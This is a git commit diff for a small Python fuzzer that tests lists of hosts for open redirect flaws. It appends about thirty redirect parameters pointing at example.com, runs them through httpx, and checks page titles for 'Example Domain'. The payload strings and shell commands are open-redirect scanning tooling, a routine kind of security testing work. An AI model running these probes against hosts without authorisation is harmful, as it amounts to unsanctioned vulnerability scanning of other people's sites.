e2858ebc8f9767fccdeaafd39f9e7831cdbc1743
Erick Fernando <erickfernandoxavier@hotmail.com>
2023-05-15 14:34:38 -0300

    Update openredirect_param_fuzzer.py

--- openredirect_param_fuzzer.py
+++ openredirect_param_fuzzer.py
@@ -10,8 +10,8 @@ args = parser.parse_args()
 payload_op_1 = "?redirect=https://example.com&url=https://example.com&link=https://example.com&return=https://example.com&next=https://example.com&return_url=https://example.com&return_uri=https://example.com&return_path=https://example.com&returnto=https://example.com&return_to=https://example.com&target=https://example.com&destination=https://example.com&returnPath=https://example.com&redirect_uri=https://example.com&redirect_url=https://example.com&goto=https://example.com"
 payload_op_2 = "?continue=https://example.com&destination=https://example.com&uri=https://example.com&go=https://example.com&to=https://example.com&returnuri=https://example.com&returnpath=https://example.com&return-path=https://example.com&callback=https://example.com&ref=https://example.com&path=https://example.com&page=https://example.com&view=https://example.com&redir=https://example.com&redirect_to=https://example.com&destination_url=https://example.com"
 
-execucao_op_1 = "cat "+args.lista+"|httpx -path '/"+payload_op_1+"'-silent -fr -title|grep 'Example'"
-execucao_op_2 = "cat "+args.lista+"|httpx -path '/"+payload_op_2+"'-silent -fr -title|grep 'Example'"
+execucao_op_1 = "cat "+args.lista+"|httpx -path '/"+payload_op_1+"'-silent -fr -title|grep 'Example Domain'"
+execucao_op_2 = "cat "+args.lista+"|httpx -path '/"+payload_op_2+"'-silent -fr -title|grep 'Example Domain'"
 
 os.system(execucao_op_1)
 os.system(execucao_op_2)
